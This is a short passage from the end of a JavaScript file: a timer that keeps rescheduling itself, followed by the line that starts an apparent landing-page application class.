                updateInterval();
            }, delay);
        };

        updateInterval();
    }
}

// Initialize the application
const app = new LandingPageApp();
